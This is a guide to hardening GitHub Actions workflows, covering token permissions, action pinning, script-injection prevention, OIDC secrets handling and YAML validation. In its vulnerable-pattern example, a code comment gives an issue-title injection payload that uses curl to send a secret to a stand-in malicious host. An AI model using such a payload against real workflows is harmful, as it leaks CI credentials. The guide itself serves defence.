# GitHub Actions Security & Best Practices

Hardening GitHub Actions workflows against security risks, supply chain attacks, and script injection.

---

## 1. Principles of Security in Workflows

1. **Least Privilege Permissions**: Default to minimal permissions; never use blanket permissions unless explicitly required.
2. **Pin Action Dependencies**: Use 40-character commit SHAs for third-party actions instead of tags.
3. **Prevent Script Injection**: Avoid interpolating untrusted expressions (`${{ github.event... }}`) directly into inline shell scripts (`run:`).
4. **Isolate Secrets**: Mask secrets in output and scope secret access to specific jobs/steps.
5. **Enforce Automated Validation**: Validate YAML syntax and structural conventions on every change.

---

## 2. Hardening Token Permissions (`permissions:`)

By default, `GITHUB_TOKEN` may have read/write access depending on organization settings. Always declare explicit workflow permissions at the top of the file:

```yaml
# Strict default permissions (Read-only contents)
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
```

For jobs requiring specific permissions (e.g. posting PR comments):
```yaml
jobs:
  comment-pr:
    permissions:
      pull-requests: write
      contents: read
    runs-on: ubuntu-latest
    steps: ...
```

---

## 3. Preventing Script Injection Vulnerabilities

### Vulnerable Pattern ❌
Interpolating untrusted inputs directly inside inline scripts allows malicious payload execution:

```yaml
# DANGEROUS! Issue title could contain: "; curl http://malicious.site/steal?key=$SECRET #"
- name: Log issue title
  run: |
    echo "Processing issue: ${{ github.event.issue.title }}"
```

### Secure Pattern ✅
Pass untrusted parameters via environment variables (`env:`):

```yaml
- name: Log issue title safely
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: |
    echo "Processing issue: $ISSUE_TITLE"
```

---

## 4. Secure Handling of Secrets

- **Never print secrets**: GitHub Actions masks registered secrets, but base64 or obfuscated secrets can leak if echoed.
- **Use `OIDC` over static long-lived credentials**: Use `aws-actions/configure-aws-credentials` or GCP Workload Identity Federation instead of storing static API keys.
- **Example OIDC Config**:
  ```yaml
  permissions:
    id-token: write
    contents: read

  steps:
    - name: Configure AWS Credentials
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/my-github-role
        aws-region: us-east-1
  ```

---

## 5. Workflow Validation Workflow

Before committing any workflow or action YAML change:
1. Run `python3 scripts/validate_yaml.py <file-path>` to verify syntax and schema formatting.
2. Ensure no hard tabs are used for indentation.
3. Verify all job steps have either `uses:` or `run:`.
4. Ensure all composite action `run:` steps specify `shell:`.
